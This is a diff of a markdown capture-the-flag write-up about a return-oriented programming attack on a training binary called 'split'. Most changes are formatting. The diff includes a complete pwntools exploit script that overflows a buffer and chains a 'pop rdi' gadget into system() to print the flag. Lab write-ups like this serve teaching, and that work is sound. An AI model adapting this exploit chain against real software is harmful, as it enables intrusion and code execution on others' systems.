@@ -118,34 +118,37 @@ And the address of this string is 0x0001060.
 ## The idea came out!
 Now we try to make an overflow and return to the address of system function after that and try to exec the system function with the parameter /bin/cat flag.txt. 
 In order to do that,we need to pass the address of the string to RDI Register. We need ROPgadget to help us implement this because it can find related string in the file
-![image](https://user-images.githubusercontent.com/77866826/236640364-d56ae265-a276-4263-acee-92b72fae5cab.png)
+!![image](https://user-images.githubusercontent.com/77866826/236640670-2d82c1f2-87ff-4c52-9c49-3f3b35b3a4cf.png)
 ![image](https://user-images.githubusercontent.com/77866826/236640501-3212fd1c-7e32-418c-b21d-15bb39fac710.png)
 We can use" pop rdi : ret "to do make it as a gadget.
 ## Build and Analyze the code
+~~~
 from pwn import *
 
-# create a process object and load the executable binary
+#create a process object and load the executable binary
 p = process('./split')
 
 
 
-# determine the offset to the return address on the stack
+#determine the offset to the return address on the stack
 offset = 40
 
-# retrieve the addresses of the desired functions/strings using the ELF object
+#retrieve the addresses of the desired functions/strings using the ELF object
 ret_address = 0x00000000004007c3
 
 
-# construct the payload by padding the offset with arbitrary characters
-# then appending the address of the return instruction and the address of the system call with the argument of the flag file
+#construct the payload by padding the offset with arbitrary characters
+#then appending the address of the return instruction and the address of the system call with the argument of the flag file
 payload = b'A' * offset + p64(ret_address) + p64(0x00601060) + p64(0x0040074b)
 
-# send the payload to the process and get the result
+#send the payload to the process and get the result
 p.sendline(payload)
 p.interactive()
-
+~~~
 
 ## Catch the Flag!!
+![image](https://user-images.githubusercontent.com/77866826/236640607-854dac44-b55d-4f5d-afd6-9bc87cc344b4.png)
+
 ## Contermeasure?
 
 > ## ROP Split Attack
